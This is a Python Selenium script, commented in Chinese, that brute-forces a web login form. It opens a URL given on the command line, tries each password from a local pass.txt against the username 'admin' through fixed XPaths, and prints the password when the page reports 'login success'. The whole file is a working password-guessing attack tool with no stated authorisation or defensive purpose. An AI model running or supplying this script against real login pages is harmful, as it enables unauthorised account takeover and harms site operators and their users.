import argparse
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

# 设置命令行参数解析
parser = argparse.ArgumentParser(description='Perform a brute force login attempt.')
parser.add_argument('url', type=str, help='The URL of the login page')
args = parser.parse_args()

# 创建 ChromeDriver 服务
service = Service(ChromeDriverManager().install())

# 初始化 WebDriver
driver = webdriver.Chrome(service=service)

# 打开网页
driver.get(args.url)  # 使用命令行传入的 URL

# 创建 ActionChains 对象
actions = ActionChains(driver)

# 使用 ActionChains 执行组合键操作
actions.key_down(Keys.CONTROL).send_keys("t").key_up(Keys.CONTROL).perform()

# 读取密码文件
with open('pass.txt', 'r', encoding="utf-8") as passwords:
    # 显式等待元素加载
    wait = WebDriverWait(driver, 10)

    for password in passwords:
        # 清空输入框
        find_login_box = wait.until(EC.presence_of_element_located(
            (By.XPATH, '//*[@id="main-container"]/div[2]/div/div[2]/div/div/form/label[1]/span/input')))
        find_pass_box = wait.until(EC.presence_of_element_located(
            (By.XPATH, '//*[@id="main-container"]/div[2]/div/div[2]/div/div/form/label[2]/span/input')))

        # 输入用户名和密码
        find_login_box.clear()  # 清空用户名输入框
        find_login_box.send_keys('admin')

        password = password.strip()
        find_pass_box.clear()  # 清空密码输入框
        find_pass_box.send_keys(password)

        # 点击登录按钮
        find_button = wait.until(EC.element_to_be_clickable(
            (By.XPATH, '//*[@id="main-container"]/div[2]/div/div[2]/div/div/form/div[2]/label/input')))
        find_button.click()

        # 等待页面加载完成
        wait.until(EC.presence_of_element_located(
            (By.XPATH, '//*[@id="main-container"]/div[2]/div/div[2]/div/div/form/label[1]/span/input')))  # 等待用户名输入框可用

        loginYN = driver.find_element(by=By.XPATH, value='//*[@id="main-container"]/div[2]/div/div[2]/div/div/p').text
        if loginYN == "login success":
            print("爆破成功，密码为:" + password)
            break  # 退出循环

# 等待一段时间以观察结果，确保程序不会闪退
input("Press Enter to close the browser...")

# 关闭浏览器
driver.quit()
